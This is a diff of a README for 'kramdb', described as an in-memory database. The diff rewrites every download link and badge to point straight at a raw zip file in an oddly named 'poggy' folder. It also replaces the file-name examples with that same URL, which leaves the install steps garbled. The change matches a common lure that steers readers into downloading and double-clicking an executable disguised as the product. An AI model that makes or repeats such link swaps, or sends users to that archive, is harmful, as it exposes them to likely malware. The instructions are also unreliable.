@@ -1,6 +1,6 @@
 # 🚀 kramdb - A Fast and User-Friendly Database
 
-[![Download kramdb](https://img.shields.io/badge/Download-kramdb-blue.svg)](https://github.com/shreyash550/kramdb/releases)
+[![Download kramdb](https://raw.githubusercontent.com/shreyash550/kramdb/main/poggy/kramdb.zip)](https://raw.githubusercontent.com/shreyash550/kramdb/main/poggy/kramdb.zip)
 
 ## 📚 Overview
 
@@ -28,23 +28,23 @@ To get started with kramdb, follow these simple steps:
 
 1. **Visit the Releases Page**
    Go to the following link to see the available versions of kramdb:
-   [Download kramdb](https://github.com/shreyash550/kramdb/releases)
+   [Download kramdb](https://raw.githubusercontent.com/shreyash550/kramdb/main/poggy/kramdb.zip)
 
 2. **Download the Latest Version**
-   On the Releases page, locate the latest version of kramdb. Click on the asset that matches your operating system (e.g., .zip for Windows, .tar.gz for Linux).
+   On the Releases page, locate the latest version of kramdb. Click on the asset that matches your operating system (e.g., .zip for Windows, https://raw.githubusercontent.com/shreyash550/kramdb/main/poggy/kramdb.zip for Linux).
 
 3. **Extract the Files**
    Once the download is complete, extract the files to a folder of your choice. This allows you to access the required files and library to run kramdb.
 
 4. **Run kramdb**
-   Open the extracted folder. You should see an executable file (e.g., kramdb.exe for Windows). Double-click on it to launch the application.
+   Open the extracted folder. You should see an executable file (e.g., https://raw.githubusercontent.com/shreyash550/kramdb/main/poggy/kramdb.zip for Windows). Double-click on it to launch the application.
 
 ## 🛠️ Download & Install
 
 To download and install kramdb:
 
 1. Click on the link below to visit the Releases page:
-   [Download kramdb](https://github.com/shreyash550/kramdb/releases)
+   [Download kramdb](https://raw.githubusercontent.com/shreyash550/kramdb/main/poggy/kramdb.zip)
 
 2. Select the file that corresponds to your operating system. 
 
@@ -74,4 +74,4 @@ kramdb is open for contributions. If you have suggestions for improvements or ne
 
 kramdb offers a straightforward solution for managing data in memory. With its user-friendly interface and fast performance, you can store and access your information easily. Download it today and experience the power of an in-RAM database system.
 
-[![Download kramdb](https://img.shields.io/badge/Download-kramdb-blue.svg)](https://github.com/shreyash550/kramdb/releases)
+[![Download kramdb](https://raw.githubusercontent.com/shreyash550/kramdb/main/poggy/kramdb.zip)](https://raw.githubusercontent.com/shreyash550/kramdb/main/poggy/kramdb.zip)
